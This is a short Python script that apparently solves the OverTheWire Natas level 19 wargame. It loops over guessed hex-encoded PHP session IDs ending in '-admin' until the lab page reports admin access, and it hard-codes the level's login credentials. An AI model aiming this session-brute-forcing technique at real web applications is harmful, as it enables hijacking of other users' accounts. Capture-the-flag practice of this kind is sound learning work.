import random
import requests
from binascii import hexlify

params = ("natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
#for i in range(1,641):
while True:
    sess = ''
    for i in range(3):
        sess += str(random.randrange(31,40))
    sess += '2d61646d696e'
    #sess = str(i) + '-admin'
    #sess = hexlify(bytes(sess,'utf-8'))
    print(sess) 
    res = requests.post(
        "http://natas19.natas.labs.overthewire.org/index.php?debug",
        auth=params,
        data={"username":"admin","password":"password"},
        cookies={'PHPSESSID':str(sess)}
    )
    #print(res.cookies)
    #print(res.content)
    if (b"You are an admin" in res.content):
        print(res.content)
        break
    	
